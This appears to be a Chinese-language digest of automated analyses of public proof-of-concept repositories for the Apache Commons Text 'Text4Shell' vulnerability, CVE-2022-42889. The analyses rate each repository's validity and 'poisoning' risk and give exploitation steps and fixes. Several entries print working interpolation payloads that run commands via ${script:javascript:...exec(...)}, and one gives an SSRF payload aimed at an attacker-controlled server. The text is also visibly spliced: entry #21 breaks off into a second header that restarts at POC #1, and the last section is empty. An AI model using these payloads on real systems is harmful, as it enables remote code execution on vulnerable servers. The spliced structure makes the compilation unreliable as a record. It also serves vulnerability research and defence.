
**来源**: [CVE-2022-42889-chainguard-dev_text4shell-policy.md](../2022/CVE-2022-42889-chainguard-dev_text4shell-policy.md)

## CVE-2022-42889 Apache Commons Text Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经授权的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text 且允许用户控制的输入传递给插值功能。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，又名Text4Shell，是Apache Commons Text库中的一个漏洞，该漏洞允许攻击者通过变量插值执行任意代码。当应用程序使用受影响版本（1.5 到 1.9）的库，并且允许不可信的输入传递给执行插值的函数时，就存在风险。 

**有效性分析：**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且危害等级高，可以远程执行代码。提供的 Dockerfile 展示了如何使用包含漏洞的 commons-text-1.0.0-SNAPSHOT.jar 包构建镜像，并通过 java -jar 命令运行，这意味着该 POC 能够重现漏洞，证明其有效性。

**投毒风险分析：**

提供的代码包括一个 Dockerfile 和一个 LICENSE 文件。Dockerfile 用于构建一个包含易受攻击的Apache Commons Text库的Java应用程序镜像。LICENSE文件是标准的Apache 2.0许可协议，本身不包含恶意代码。由于Dockerfile只是部署了漏洞利用所需的易受攻击的jar包，并没有其他可疑操作，因此该仓库直接包含投毒代码的可能性较低，但存在一定的供应链风险，即如果依赖的jar包本身就被投毒，那么部署的应用也就会被投毒。综合判断，投毒的可能性评估为5%。

**利用方式：**

该漏洞的利用方式是构造包含恶意表达式的字符串，利用 Apache Commons Text 的字符串插值功能执行任意代码。具体步骤如下：

1.  确定应用程序中使用了 Apache Commons Text 库，并且版本在 1.5 到 1.9 之间。
2.  找到应用程序中允许用户控制的输入点，该输入会被传递给 Apache Commons Text 的字符串插值功能。
3.  构造包含恶意表达式的输入字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('evil command')}`。其中，`script` 前缀指示使用 javax.script 引擎执行代码。其他的利用方式还包括使用 `dns` 和 `url` 前缀。
4.  将构造的恶意字符串发送给应用程序。
5.  应用程序使用 Apache Commons Text 进行字符串插值时，会执行恶意表达式，从而导致远程代码执行。

**修复建议：**

升级到 Apache Commons Text 1.10.0 或更高版本。该版本默认禁用了有风险的插值器。

**项目地址:** [chainguard-dev/text4shell-policy](https://github.com/chainguard-dev/text4shell-policy)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #14

**来源**: [CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md](../2022/CVE-2022-42889-cryxnet_CVE-2022-42889-RCE.md)

## CVE-2022-42889-Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意命令

**影响版本:** 1.5 - 1.9

**利用条件:** 需要应用程序使用Apache Commons Text 1.5-1.9版本,并且允许从不受信任的源接收和处理字符串输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中存在不安全的变量插值功能。攻击者可以通过构造包含恶意表达式的字符串，利用`${prefix:name}`格式进行插值，其中 `prefix` 指定了 `StringLookup` 的实例，而 `name` 包含了要执行的命令或表达式。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且影响Apache Commons Text 1.5到1.9版本。POC代码的`README.md`文件描述了漏洞原理和利用方式，`main.py`文件包含了利用漏洞的代码示例。利用脚本中使用了`script`、`url` 和 `dns` 等前缀，这些前缀在受影响的版本中默认启用，可导致任意代码执行。

**投毒风险：**
该POC代码主要目标是利用漏洞，但存在一定的投毒风险。风险评估在10%。主要原因分析如下：

*   **代码混淆/隐藏：** 虽然没有明显的混淆，但是代码的可读性不是非常高，存在一些压缩和简化写法，这可能用来隐藏恶意代码。
*   **恶意依赖：** 脚本中使用了`os`, `requests`, `colorama`, `base64`, `nmap`库。这些库本身没有问题，但存在被滥用的可能. 比如`os.system` 或 `subprocess.call` 执行恶意命令.
*   **Payload生成：** 脚本中定义了`payloads`字典，其中包含一些 RCE Payload。攻击者可能会修改这些payload执行恶意指令。
*   **网络行为：** 脚本使用`requests`库，可能用于下载恶意payload或者回传信息。`nmap` 也可能被滥用。
*   **powershellRevshell：** 脚本包含了一个powershell reverse shell 脚本，需要LHOST和LPORT，可能被用于植入后门。

**利用方式：**
利用方式如下：
1.  **漏洞定位：** 找到使用存在漏洞的 Apache Commons Text 库，且允许用户可控输入的地方。
2.  **构造Payload：** 构造包含恶意表达式的字符串，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('COMMAND')}`。将 'COMMAND' 替换为要执行的命令。
3.  **发送Payload：** 将构造的Payload发送到目标应用程序。
4.  **执行代码：** 如果应用程序使用存在漏洞的Commons Text库处理了Payload，那么恶意命令将被执行。

**总结：**
该漏洞利用的有效性较高，因为可以通过多种方式执行任意命令。虽然提供的POC主要是为了验证漏洞，但是如果被恶意修改，仍然存在投毒的可能。使用该POC时需要注意安全风险，并对其代码进行详细审查。

**项目地址:** [cryxnet/CVE-2022-42889-RCE](https://github.com/cryxnet/CVE-2022-42889-RCE)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #15

**来源**: [CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md](../2022/CVE-2022-42889-cxzero_CVE-2022-42889-text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= 版本 <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户控制的输入传递给 StringSubstitutor.replace() 或 StringSubstitutor.replaceIn() 方法进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为 Text4Shell，是一个存在于 Apache Commons Text 库中的高危漏洞。该漏洞源于库中 StringSubstitutor 类的变量插值功能。如果应用程序使用受影响版本（1.5 到 1.9）的 Apache Commons Text，并且允许用户控制的输入用于字符串插值，那么攻击者可以通过构造恶意输入来执行任意代码。

**利用方式：**

攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指定了用于查找 `StringLookup` 实例的前缀。漏洞存在于以下几个 lookup 中：

*   **script:** 允许使用 JVM 脚本执行引擎（javax.script）执行表达式。例如，在 JDK 15 之前，可以使用 Nashorn 引擎执行 JavaScript 代码，从而执行任意命令：`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`。在 JDK 15 及更高版本中，如果应用程序包含 JEXL 等第三方依赖，仍然可能通过类似方式执行代码。
*   **dns:** 允许解析 DNS 记录。虽然不能直接执行代码，但可以用于信息收集或发起拒绝服务攻击：`${dns:address|commons.apache.org}`。
*   **url:** 允许从指定的 URL 加载值，包括远程服务器。这可以用来读取敏感信息或通过 SSRF 发起攻击：`${url:UTF-8:https://nvd.nist.gov/vuln/detail/CVE-2022-42889}`。

**POC 分析：**

提供的 Dockerfile 和 README 文件提供了一个可用于测试和验证此漏洞的 POC 环境。Dockerfile 设置了所需的 Java 环境，并编译和运行包含漏洞的应用程序。README 提供了不同利用方式的示例，包括使用 `script`、`dns` 和 `url` lookup 的 payload。

**投毒风险分析：**

根据提供的文件内容，该仓库的主要目的是为了重现和演示 CVE-2022-42889 漏洞。评估投毒风险较低。Dockerfile虽然安装了一些如netcat，wget，curl等工具，可以辅助漏洞验证。但根据POC利用的常规方式，以及参考互联网上已公开的POC和EXP来看，这些工具都是常规操作。

**总结：**

CVE-2022-42889 是一个严重的安全漏洞，允许攻击者远程执行代码。应用程序应尽快升级到 Apache Commons Text 1.10.0 或更高版本，以禁用有问题的 interpolator，并仔细审查代码，确保用户提供的输入不会用于字符串插值。提供的 POC 代码对于理解和验证漏洞非常有用，但应谨慎使用，并采取适当的安全措施。

**项目地址:** [cxzero/CVE-2022-42889-text4shell](https://github.com/cxzero/CVE-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #16

**来源**: [CVE-2022-42889-devenes_text4shell-cve-2022-42889.md](../2022/CVE-2022-42889-devenes_text4shell-cve-2022-42889.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的Apache Commons Text，且允许用户可控的输入传递给使用了不安全插值默认值的文本处理函数。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

该漏洞存在于Apache Commons Text 1.5到1.9版本中，由于默认启用的StringLookup实例存在安全问题，允许攻击者在应用程序处理用户提供的字符串时执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。漏洞利用代码（Dockerfile、README.md、pom.xml）提供了一个可运行的示例，展示了如何利用该漏洞执行任意命令。

**投毒风险：**

该POC代码的主要目的是演示CVE-2022-42889漏洞的利用。Dockerfile构建了一个包含漏洞的Java应用程序，README.md提供了运行和测试该应用程序的说明，pom.xml则定义了Maven项目的依赖和构建配置。尽管POC代码本身是为了演示漏洞，潜在的投毒风险极低（约1%）。

**利用方式：**

1.  **漏洞原理：** Apache Commons Text 存在变量插值功能，允许动态评估和扩展属性。受影响版本中，默认启用的 `script`、`dns` 和 `url` 等 StringLookup 实例允许执行任意代码、解析 DNS 记录或加载 URL。如果应用程序允许用户控制输入，则可能遭受远程代码执行攻击。
2.  **攻击步骤：**
    a.  部署包含漏洞的应用程序。
    b.  向应用程序发送包含恶意payload的请求。Payload利用 `${prefix:name}` 格式，其中 `prefix` 是 `script`、`dns` 或 `url`，`name` 包含要执行的恶意代码。
    c.  服务器处理请求，执行payload，导致远程代码执行。
3.  **示例payload：**
    `${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`

此payload使用 `script` 前缀执行 JavaScript 代码，调用 `java.lang.Runtime.getRuntime().exec()` 执行 `touch /tmp/foo` 命令，在目标服务器上创建 `/tmp/foo` 文件。

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   禁用或限制应用程序中使用的不安全 StringLookup 实例。
*   对用户提供的输入进行严格的验证和清理，以防止恶意payload注入。

**项目地址:** [devenes/text4shell-cve-2022-42889](https://github.com/devenes/text4shell-cve-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #17

**来源**: [CVE-2022-42889-f0ng_text4shellburpscanner.md](../2022/CVE-2022-42889-f0ng_text4shellburpscanner.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text，且允许用户控制的输入传递给`StringSubstitutor.replace()`方法。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889 (Text4Shell) 漏洞存在于 Apache Commons Text 1.5 到 1.9 版本。该漏洞源于库中不安全的插值默认设置，当应用程序使用这些默认设置且允许用户控制输入时，攻击者可以利用 `${prefix:name}` 格式的字符串，其中 `prefix` 指示要使用的 `StringLookup` 实例。受影响的版本默认包含 `script`、`dns` 和 `url` 这几个 lookup，利用 `script` 可以执行任意 JVM 脚本，利用 `dns` 可以解析 DNS 记录，利用 `url` 可以从远程服务器加载值。攻击者可以构造恶意输入，例如 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意命令。提供的漏洞利用代码是一个 Burp Suite 插件，用于检测是否存在此漏洞，它并没有直接执行恶意代码，只是辅助进行漏洞验证。从代码本身来看，没有明显的恶意行为，但考虑到Burp插件的功能强大，理论上作者可以暗中收集用户的使用数据或者篡改请求包，但这种可能性较低，约1%。

**利用方式：**

1.  **确定目标应用程序是否使用了受影响版本的 Apache Commons Text。**
2.  **确定应用程序是否允许用户控制的输入传递给 `StringSubstitutor.replace()` 方法。**
3.  **构造包含恶意插值表达式的输入。** 例如,`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。
4.  **将恶意输入发送到目标应用程序。**
5.  **如果应用程序存在漏洞，则恶意命令将在服务器上执行。**

**缓解措施：**

*   升级到 Apache Commons Text 1.10.0 或更高版本，该版本默认禁用有问题的插值器。
*   如果无法升级，则可以禁用应用程序中的 `script`、`dns` 和 `url` 插值器。

**项目地址:** [f0ng/text4shellburpscanner](https://github.com/f0ng/text4shellburpscanner)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #18

**来源**: [CVE-2022-42889-gokul-ramesh_text4shell-exploit.md](../2022/CVE-2022-42889-gokul-ramesh_text4shell-exploit.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未授权的攻击者执行任意代码

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的Apache Commons Text, 并且允许变量插值处理不受信任的输入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个存在于Apache Commons Text库中的高危漏洞。该漏洞源于库中不安全的变量插值默认设置。攻击者可以通过构造包含恶意表达式的输入，利用`${prefix:name}`格式进行插值，触发远程代码执行。

**有效性：** 根据漏洞库信息和搜索结果，该漏洞利用是有效的，并且影响Apache Commons Text 1.5到1.9版本。提供的POC代码尝试利用`script`, `url` 和 `dns` 等 lookup 实现远程代码执行。

**投毒风险：**
*   POC代码本身的主要目的是为了验证漏洞的存在，利用interactsh来验证命令执行。投毒风险评估较低，约为10%。
*   投毒风险主要来自以下方面：虽然POC主要目的是进行漏洞验证，但如果使用者不小心，直接在生产环境运行，可能会造成破坏。此外，攻击者可能修改POC代码，添加恶意功能，例如植入后门，并传播修改后的POC。
*   代码中使用了 `ping` 命令进行验证，这本身没有危害，但恶意修改者可能替换成更危险的命令。

**利用方式：**
1.  **漏洞定位：** 确定目标应用程序使用了Apache Commons Text 1.5到1.9的受影响版本。
2.  **构造Payload：** 构造包含恶意表达式的输入字符串，利用`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`, `${url:UTF-8:java.lang.Runtime.getRuntime().exec('command')}` 或者 `${dns:address:java.lang.Runtime.getRuntime().exec('command')}` 这样的格式。
3.  **发送Payload：** 将构造的Payload作为输入发送到目标应用程序，例如通过HTTP请求的查询参数或User-Agent头。
4.  **执行代码：** 如果应用程序使用Commons Text对Payload进行变量插值，恶意代码将被执行。
5.  **验证：** 使用interactsh等工具验证代码是否成功执行。例如, 通过DNS请求或者ping命令。

**缓解措施：**
*   升级到Apache Commons Text 1.10.0或更高版本，该版本默认禁用了有问题的插值器。
*   如果无法升级，可以配置`StringLookupFactory`以禁用`script`、`dns`和`url`查找。
*   对所有用户输入进行严格的验证和清理，避免将不受信任的数据传递给Commons Text进行处理。

**项目地址:** [gokul-ramesh/text4shell-exploit](https://github.com/gokul-ramesh/text4shell-exploit)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #19

**来源**: [CVE-2022-42889-hotblac_text4shell.md](../2022/CVE-2022-42889-hotblac_text4shell.md)

## CVE-2022-42889 - Apache Commons Text RCE (Text4Shell)

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** <= 1.9

**利用条件:** 应用程序必须使用受影响版本的Apache Commons Text，并且允许用户控制的输入传递给StringSubstitutor进行插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889 (Text4Shell) 是 Apache Commons Text 库中的一个漏洞，允许攻击者通过操纵传递给 `StringSubstitutor` 的输入来执行任意代码。漏洞存在于1.5到1.9版本中。升级到1.10.0及以上版本可以解决此问题，因为该版本默认禁用了有问题的插值器，或者禁用受影响的lookup，例如`script`, `dns`, `url`。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码（尤其是 `src/main/java/org/dontpanic/text4shell/controller/ExploitMeController.java` 文件）旨在演示此漏洞。`ExploitMeController` 中的 `/lookup` 端点接收用户提供的 `value`，并将其直接传递给 `StringSubstitutor.replace()` 方法，而没有进行任何清理或验证。这允许攻击者注入恶意表达式，例如`${script:javascript:Runtime.getRuntime().exec("command")}`，从而导致远程代码执行。

**投毒风险：**
提供的代码主要是漏洞利用的演示，旨在重现和展示 CVE-2022-42889。虽然代码本身并没有明显的恶意或后门性质，但存在一些小的风险。由于整个仓库的目的就是为了演示漏洞，如果有人下载并部署了这个应用，并将其暴露在公网上，那么它会立即成为攻击目标。因此，可以认为存在很低的投毒风险 (约5%)，因为作者可能故意提供一个容易被利用的环境，但不是传统意义上的“投毒”，而是漏洞演示的副产品。

**利用方式：**
1.  **目标系统：** 目标系统需要运行使用了 Apache Commons Text 1.5 到 1.9 版本的应用程序。
2.  **输入注入：** 攻击者需要找到一个应用程序接口，该接口允许用户提供输入，然后应用程序使用受影响的 Apache Commons Text 版本对该输入进行插值处理。例如，在提供的 POC 中，`/lookup` 端点就是一个这样的接口。
3.  **构造恶意Payload：**  攻击者需要构造一个包含恶意表达式的Payload，该表达式利用了 `script`, `dns`, 或 `url` lookup 来执行代码或进行其他恶意操作。示例Payload：
    *   `${script:javascript:Runtime.getRuntime().exec('touch /tmp/pwned')}` - 执行任意命令 (例如，创建一个文件)。
    *   `${dns:address|example.com}` - 执行 DNS 查询。
    *   `${url:UTF-8:https://example.com/evil.txt}` - 从远程 URL 加载内容。
4.  **发送Payload：**  攻击者将构造的Payload发送到目标应用程序的易受攻击的接口。
5.  **代码执行：**  如果应用程序使用 `StringSubstitutor` 处理Payload，它将执行Payload中的恶意表达式，从而导致远程代码执行或其它恶意行为。


**项目地址:** [hotblac/text4shell](https://github.com/hotblac/text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #20

**来源**: [CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-joshbnewton31080_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行

**影响应用:** Apache Commons Text

**危害等级:** 高危，允许远程代码执行

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户控制的输入传递给StringSubstitutor.replace()方法

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text库中的一个远程代码执行漏洞。该漏洞源于库中使用的字符串插值功能，攻击者可以通过构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。提供的POC代码通过创建一个简单的Spring Boot应用程序，演示了如何利用该漏洞。`HelloController.java`文件中的`attack`方法使用`StringSubstitutor.createInterpolator()`创建插值器，并使用`interpolator.replace(search)`来替换用户提供的输入。如果应用程序使用Commons Text 1.5到1.9版本，并且允许用户控制的输入传递给`replace()`方法，则攻击者可以利用此漏洞执行任意代码。

**有效性：**

根据提供的漏洞库信息、搜索引擎结果和POC代码，可以判断该漏洞利用是有效的。POC代码展示了利用`script`前缀执行`touch`命令的例子。搜索引擎结果也确认了该漏洞的存在以及利用方式。

**投毒风险：**

审查提供的文件，Dockerfile文件用于构建Docker镜像，pom.xml是Maven的配置文件，用于管理项目依赖和构建过程，src/main/java包含了应用程序的源代码，src/test/java 包含了测试代码。这些文件本身不包含明显的恶意代码，因此可以判断投毒风险较低。pom.xml 中指定的 commons-text 版本是1.8， 属于漏洞版本。 Dockerfile文件也没问题。

**利用方式：**

1.  应用程序使用Apache Commons Text 1.5到1.9版本。
2.  应用程序允许用户控制的输入传递给`StringSubstitutor.replace()`方法。
3.  攻击者构造包含恶意脚本的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  应用程序使用`StringSubstitutor.replace()`方法替换输入，触发漏洞，执行恶意代码。

**项目地址:** [joshbnewton31080/cve-2022-42889-text4shell](https://github.com/joshbnewton31080/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #21

**来源**: [CVE-2022-42889-karthikuj_cve-2022-42889-text4shell-docker.md](../2022/CVE-2022-42889-karthikuj_cve-2022-42889-text4shell-docker.md)

# CVE-2022-42889

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2022-42889-34006133_CVE-2022-42889.md](../2022/CVE-2022-42889-34006133_CVE-2022-42889.md)

## CVE-2022-42889 Text4Shell RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用受影响版本的 Apache Commons Text，并且允许用户可控的输入传递给执行插值的函数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889 (Text4Shell) 是一个 Apache Commons Text 库中的远程代码执行漏洞。该漏洞源于库中存在变量插值功能，允许动态评估和扩展属性。在 1.5 到 1.9 版本中，默认的 Lookup 实例包含一些插值器，例如 "script", "dns", 和 "url"，这些插值器可能导致任意代码执行或与远程服务器通信。如果应用程序使用这些默认插值器并且允许用户可控的输入进行插值，那么攻击者可以通过构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，来执行任意代码。提供的漏洞利用代码 `main.go` 尝试构造一个包含恶意payload的URL，该URL包含一个 `${script:javascript:java.lang.Runtime.getRuntime().exec('command')}` 形式的payload, 并通过HTTP GET请求发送到目标服务器。`possiblepoc.go` 文件似乎尝试创建一个反向shell。 根据代码分析,未发现作者隐藏的恶意投毒代码。利用方式：1. 确定目标应用程序正在使用受影响版本的 Apache Commons Text 并且暴露了允许用户输入进行插值的接口。2. 构造包含恶意表达式的输入，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`。3. 将构造的输入发送到目标应用程序，触发漏洞并执行任意代码。

**项目地址:** [34006133/CVE-2022-42889](https://github.com/34006133/CVE-2022-42889)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #2

**来源**: [CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md](../2022/CVE-2022-42889-808ale_CVE-2022-42889-Text4Shell-POC.md)

## CVE-2022-42889-Apache Commons Text-RCE/SSRF

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE) / 服务器端请求伪造 (SSRF)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行或服务器端请求伪造

**影响版本:** < 1.10.0 (1.5 <= version <= 1.9)

**利用条件:** 应用程序使用受影响的Apache Commons Text版本，并且允许用户可控输入被用于文本插值。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-42889，也被称为Text4Shell，是Apache Commons Text 1.5到1.9版本中的一个严重漏洞。该漏洞允许攻击者通过构造包含恶意表达式的字符串，利用文本插值功能执行任意代码（RCE）或发起服务器端请求伪造（SSRF）攻击。

**有效性分析：**

提供的POC代码是一个Python脚本，旨在测试目标系统是否存在Text4Shell漏洞。该脚本支持两种模式：

*   **RCE模式：** 利用`script`前缀，尝试执行JavaScript命令。具体而言，它使用Nashorn引擎（在Java 15及更高版本中默认禁用）来执行操作系统命令。如果目标系统启用了Nashorn引擎，则可能成功执行RCE攻击。
*   **SSRF模式：** 利用`url`前缀，尝试从指定的URL获取内容。这可能导致服务器向攻击者控制的服务器发出请求，从而泄露敏感信息或进行其他攻击。

根据NVD信息和搜索引擎结果，该漏洞影响Apache Commons Text 1.5到1.9版本，利用的关键在于应用程序是否接受用户可控的输入并将其传递给`StringSubstitutor.replace()`等插值方法。

因此，该POC代码在特定条件下是有效的。如果目标系统使用了受影响的Apache Commons Text版本，并且允许用户输入参与文本插值，那么攻击者就可以利用该漏洞。

**投毒风险分析：**

对提供的POC代码进行分析，可以发现其中存在轻微的投毒风险。虽然脚本本身的功能是测试漏洞，但如果攻击者修改脚本，例如：

*   **修改RCE命令：** 将测试命令替换为恶意命令，例如下载并执行恶意程序。
*   **修改SSRF URL：** 将SSRF目标URL替换为指向包含恶意内容的URL，例如包含恶意JavaScript代码的页面。
*   **增加额外功能** 添加未经授权的信息收集功能。

这些修改可能会导致用户在不知情的情况下受到攻击。

因此，评估的投毒风险为5%。主要集中在使用人员的安全意识上，是否存在下载后未进行代码审核直接执行的情况。

**利用方式：**

1.  **确定目标系统使用的Apache Commons Text版本是否在受影响范围内 (1.5-1.9)。**
2.  **找到应用程序中接受用户输入并使用Apache Commons Text进行文本插值的位置。**
3.  **构造包含恶意表达式的字符串，例如：**
    *   `${script:javascript:java.lang.Runtime.getRuntime().exec('malicious_command')}` (RCE，需要Nashorn引擎支持)
    *   `${url:UTF-8:http://attacker_controlled_server/resource}` (SSRF)
4.  **将构造的恶意字符串作为用户输入传递给应用程序。**
5.  **如果漏洞利用成功，攻击者将能够执行任意代码或发起SSRF攻击。**

**项目地址:** [808ale/CVE-2022-42889-Text4Shell-POC](https://github.com/808ale/CVE-2022-42889-Text4Shell-POC)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #3

**来源**: [CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-Dima2021_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行（RCE）

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 1.5 <= version <= 1.9

**利用条件:** 应用程序使用了受影响版本的 Apache Commons Text，并且允许用户控制输入，该输入会被用于字符串插值。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-42889，也被称为Text4Shell，是一个影响Apache Commons Text库的远程代码执行漏洞。该漏洞源于Apache Commons Text在1.5到1.9版本中，默认启用了一些不安全的StringLookup实现，如`script`，`dns`和`url`。当应用程序使用这些默认的Lookup实例并且允许用户控制输入时，攻击者可以通过构造恶意的字符串，利用变量插值功能执行任意代码。

**有效性分析：**

提供的POC代码是一个Spring Boot应用程序，它使用Apache Commons Text库进行字符串插值。`HelloController.java`文件中的`attack`方法接收一个名为`search`的请求参数，并使用`StringSubstitutor.createInterpolator()`创建一个插值器，然后使用`interpolator.replace(search)`方法对`search`参数进行插值。这意味着攻击者可以通过`search`参数传递恶意的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}`，来执行任意代码。`pom.xml`文件显示该项目使用了Apache Commons Text 1.8版本，属于受影响的版本范围。`README.md`文件提供了构建、运行和测试该POC应用程序的步骤，并提供了一个示例攻击payload。

根据漏洞信息和POC代码分析，该POC代码是有效的，可以用于演示和验证CVE-2022-42889漏洞。

**投毒风险分析：**

分析提供的代码，没有发现明显的投毒代码。该仓库的主要目的是为了演示CVE-2022-42889漏洞，代码结构清晰，功能单一，主要就是接收输入并利用commons-text进行解析。

**利用方式：**

1.  攻击者首先需要找到一个应用程序，该应用程序使用了受影响版本的Apache Commons Text库（1.5到1.9）。
2.  攻击者需要找到一个允许用户控制输入的地方，该输入会被传递给`StringSubstitutor.replace()`方法进行插值。
3.  攻击者构造一个包含恶意payload的字符串，例如`${script:javascript:java.lang.Runtime.getRuntime().exec('command')}`，其中`command`是要执行的任意命令。
4.  攻击者将构造的恶意字符串作为输入传递给应用程序。
5.  应用程序使用`StringSubstitutor.replace()`方法对输入进行插值，从而执行攻击者指定的命令。

利用`dns`，攻击者可以构造payload让服务器解析恶意域名，从而进行信息收集或发起其他攻击。利用`url`，攻击者可以让服务器请求恶意URL，从而可能导致SSRF（服务器端请求伪造）漏洞。

**修复建议：**

升级到Apache Commons Text 1.10.0或更高版本。新版本默认禁用了`script`，`dns`和`url`等不安全的StringLookup实现。如果必须使用这些Lookup，请确保只在可信的环境中使用。

**项目地址:** [Dima2021/cve-2022-42889-text4shell](https://github.com/Dima2021/cve-2022-42889-text4shell)

**漏洞详情:** [CVE-2022-42889](https://nvd.nist.gov/vuln/detail/CVE-2022-42889)

---

## POC #4

**来源**: [CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md](../2022/CVE-2022-42889-DimaMend_cve-2022-42889-text4shell.md)

## CVE-2022-42889-Apache Commons Text-RCE

**漏洞编号:** CVE-2022-42889

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Commons Text

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 1.9

**利用条件:** 应用使用了受影响版本的Apache Commons Text，并且允许用户可控的字符串参与到`${}`表达式的解析过程中

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

